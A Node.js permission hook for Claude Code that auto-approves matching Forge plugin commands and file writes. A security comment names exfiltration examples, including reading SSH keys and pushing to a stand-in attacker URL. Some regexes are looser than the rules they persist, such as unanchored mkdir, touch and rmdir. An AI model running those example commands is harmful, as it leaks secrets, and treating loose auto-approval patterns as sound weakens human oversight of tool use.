#!/usr/bin/env node
// Forge permission auto-approver — runs on PermissionRequest events.
//
// Purpose: eliminate the permission prompt storm (BUG-014) by auto-approving
// known Forge tool patterns and persisting allow rules to localSettings.
//
// Protocol (Claude Code PermissionRequest hook):
//   - stdin: JSON envelope { tool_name, tool_input, permission_suggestions }
//   - stdout: { hookSpecificOutput: { hookEventName, decision: { behavior,
//     updatedPermissions } } } to allow and persist rules
//   - exit 0 with no output: let normal permission flow proceed
//   - exit 2 with stderr: block the tool call
//
// Security model:
//   - This hook can only ALLOW, never DENY
//   - User deny rules always take precedence over hook allows
//   - Rules persist to .claude/settings.local.json (gitignored, per-project)
//   - Users can inspect/remove rules via /permissions

'use strict';

process.on('uncaughtException', (err) => {
  try { process.stderr.write(`forge-permissions: internal error (fail-open): ${err.message}\n`); } catch (_) {}
  process.exit(0);
});

// ── Pattern registry ──────────────────────────────────────────────
// Each entry: { pattern: RegExp, rule: string }
// pattern matches against the tool input string (Bash command, file path, or URL)
// rule is the allow rule content to persist via updatedPermissions
//
// Forge-command patterns within BASH_PATTERNS overlap with FORGE_COMMAND_PATTERNS.
// Canonical source for forge command recognition: hooks/lib/common.cjs:FORGE_COMMAND_PATTERNS
// (H-1d, FORGE-S25-T08). This file intentionally does NOT require hooks/lib/common.cjs
// because build-payload.cjs bundles hooks/*.cjs but excludes hooks/lib/ (forge-cli bundle gap).
// When adding a new forge command, update BOTH this list AND hooks/lib/common.cjs:FORGE_COMMAND_PATTERNS.

// H-5d: Interpolate CLAUDE_PLUGIN_ROOT into node-tool rule when the env var is set.
// Falls back to the hardcoded glob when CLAUDE_PLUGIN_ROOT is not available.
const _nodeToolRule = process.env.CLAUDE_PLUGIN_ROOT
  ? `node ${process.env.CLAUDE_PLUGIN_ROOT}/tools/*`
  : 'node ~/.claude/plugins/cache/forge/forge/*/tools/*';

// SECURITY (issue #43 / forge-engineering #42): these patterns auto-approve a
// Bash command with NO prompt. A non-match falls through to Claude Code's normal
// permission flow (the human is asked) — it does NOT block. So the rule is:
// auto-allow ONLY shapes that are unambiguously in-tree Forge workflow steps,
// and let anything that could read a secret, exfiltrate, or execute foreign code
// fall through to a prompt. Patterns are anchored to their argument shape, not a
// bare command prefix, precisely so `cat ~/.ssh/id_rsa`, `cp <secret> /tmp/x`,
// `gh issue create -R attacker/repo`, `git push https://attacker/…`, and
// `node /tmp/evil/tools/x.cjs` are NOT auto-approved.
const BASH_PATTERNS = [
  // Node tool invocations — only when the directory before /tools/ is a trusted
  // Forge root: $FORGE_ROOT / $CLAUDE_PLUGIN_ROOT, the plugin cache, or a path
  // ending in /.forge. `node /tmp/evil/tools/x.cjs` does NOT match.
  // (H-5d: rule is dynamically built from CLAUDE_PLUGIN_ROOT when set)
  {
    pattern:
      /^node\s+(?:"?\$(?:CLAUDE_PLUGIN_ROOT|FORGE_ROOT)"?|\S*\/\.claude\/plugins\/cache\/forge\/\S*|\S*\/\.forge)\/tools\/[\w-]+\.(?:cjs|js)\b/,
    rule: _nodeToolRule,
  },
  // NOTE: node -e and node -p removed — arbitrary code execution must not be auto-approved.
  // Forge workflows use node .../tools/*.cjs for tool invocations; inline node -e/p requires
  // explicit user approval each time.
  // Shell commands used by Forge workflows
  { pattern: /^mkdir\s+-p\s+/, rule: 'mkdir -p .forge/*' },
  { pattern: /^mkdir\s+-p\s+\S+/, rule: 'mkdir -p .forge/*' },
  // cp only when the destination (last arg) is under .forge/ — copying a secret
  // out to an arbitrary location is not auto-approved.
  { pattern: /^cp\s+\S.*\s\.?\/?\.forge\/\S*\s*$/, rule: 'cp */schemas/*.schema.json .forge/schemas/' },
  { pattern: /^ls\s+/, rule: 'ls *' },
  // cat only within .forge/ or engineering/ — reading arbitrary files (e.g.
  // ~/.ssh/id_rsa, /etc/passwd) falls through to a prompt.
  { pattern: /^cat\s+(?:-\S+\s+)*\.?\/?(?:\.forge|engineering)\//, rule: 'cat .forge/*' },
  { pattern: /^date\s+-u\s+/, rule: 'date -u *' },
  { pattern: /^date\s+/, rule: 'date -u *' },
  { pattern: /^jq\s+/, rule: 'jq *' },
  { pattern: /^touch\s+/, rule: 'touch .forge/*' },
  { pattern: /^uname\s+/, rule: 'uname *' },
  { pattern: /^rm\s+\.forge/, rule: 'rm .forge/*' },
  { pattern: /^rm\s+-rf\s+\.forge/, rule: 'rm -rf .forge/*' },
  { pattern: /^rmdir\s+/, rule: 'rmdir .forge/*' },
  { pattern: /^gh\s+auth\s+/, rule: 'gh auth status *' },
  // gh issue only against the current repo — a -R/--repo pointing at a foreign
  // repo (cross-repo exfiltration) is not auto-approved.
  { pattern: /^gh\s+issue\s+(?!.*(?:\s-R\b|\s--repo\b))/, rule: 'gh issue create *' },
  // git read-only commands (already auto-approved by Claude Code, but belt-and-suspenders)
  { pattern: /^git\s+status\b/, rule: 'git status *' },
  { pattern: /^git\s+log\b/, rule: 'git log *' },
  { pattern: /^git\s+diff\b/, rule: 'git diff *' },
  { pattern: /^git\s+add\s+/, rule: 'git add *' },
  { pattern: /^git\s+commit\s+-m\s+/, rule: 'git commit -m *' },
  // git push only to a named remote — pushing to an explicit attacker URL
  // (http(s)/ssh/git/file) is not auto-approved.
  { pattern: /^git\s+push\b(?!.*(?:https?:\/\/|git@|ssh:\/\/|file:\/\/))/, rule: 'git push *' },
  { pattern: /^git\s+checkout\s+/, rule: 'git checkout *' },
  { pattern: /^git\s+branch\s+/, rule: 'git branch *' },
  { pattern: /^git\s+stash\b/, rule: 'git stash *' },
  { pattern: /^git\s+worktree\s+/, rule: 'git worktree *' },
];

const WRITE_PATTERNS = [
  { pattern: /^\.forge\//, rule: '.forge/**' },
  { pattern: /^\.claude\/commands\//, rule: '.claude/commands/**' },
  { pattern: /^engineering\//, rule: 'engineering/**' },
  { pattern: /^CLAUDE\.md$/i, rule: 'CLAUDE.md' },
  { pattern: /^AGENTS\.md$/i, rule: 'AGENTS.md' },
  { pattern: /^\.gitignore$/, rule: '.gitignore' },
];

const EDIT_PATTERNS = [
  { pattern: /^\.forge\//, rule: '.forge/**' },
  { pattern: /^\.claude\/commands\//, rule: '.claude/commands/**' },
  { pattern: /^engineering\//, rule: 'engineering/**' },
  { pattern: /^CLAUDE\.md$/i, rule: 'CLAUDE.md' },
  { pattern: /^AGENTS\.md$/i, rule: 'AGENTS.md' },
];

const WEBFETCH_PATTERNS = [
  { pattern: /^https:\/\/raw\.githubusercontent\.com\/Entelligentsia\/forge\//, rule: 'domain:raw.githubusercontent.com' },
];

const PATTERN_MAP = {
  Bash: BASH_PATTERNS,
  Write: WRITE_PATTERNS,
  Edit: EDIT_PATTERNS,
  MultiEdit: EDIT_PATTERNS,
  WebFetch: WEBFETCH_PATTERNS,
};

// ── Core logic ─────────────────────────────────────────────────────

function matchTool(toolName, toolInput) {
  const patterns = PATTERN_MAP[toolName];
  if (!patterns) return null;

  const input = toolName === 'Bash' ? (toolInput.command || '')
    : (toolName === 'Write' || toolName === 'Edit' || toolName === 'MultiEdit') ? (toolInput.file_path || '')
    : toolName === 'WebFetch' ? (toolInput.url || '')
    : '';

  for (const { pattern, rule } of patterns) {
    if (pattern.test(input)) return rule;
  }
  return null;
}

// ── Export for testing ─────────────────────────────────────────────
module.exports = { matchTool, BASH_PATTERNS, WRITE_PATTERNS, EDIT_PATTERNS, WEBFETCH_PATTERNS };

// ── Main (hook runner) ────────────────────────────────────────────
if (require.main === module) {
let input = '';
process.stdin.on('data', (d) => { input += d; });
process.stdin.on('end', () => {
  let event;
  try {
    event = JSON.parse(input);
  } catch (_) {
    // Unparseable input — fail open, let normal permission flow handle it
    process.exit(0);
  }

  const { tool_name, tool_input } = event;
  if (!tool_name || !tool_input) {
    process.exit(0);
  }

  const matchedRule = matchTool(tool_name, tool_input || {});
  if (matchedRule) {
    // Persist only the matched rule — never bulk-approve all rules at once.
    const response = {
      hookSpecificOutput: {
        hookEventName: 'PermissionRequest',
        decision: {
          behavior: 'allow',
          updatedPermissions: [{
            type: 'addRules',
            rules: [{ toolName: tool_name, ruleContent: matchedRule }],
            behavior: 'allow',
            destination: 'localSettings',
          }],
        },
      },
    };
    process.stdout.write(JSON.stringify(response));
    process.exit(0);
  }

  // Not a Forge pattern — exit 0 with no output to let normal permission flow proceed
  process.exit(0);
});
} // end require.main === module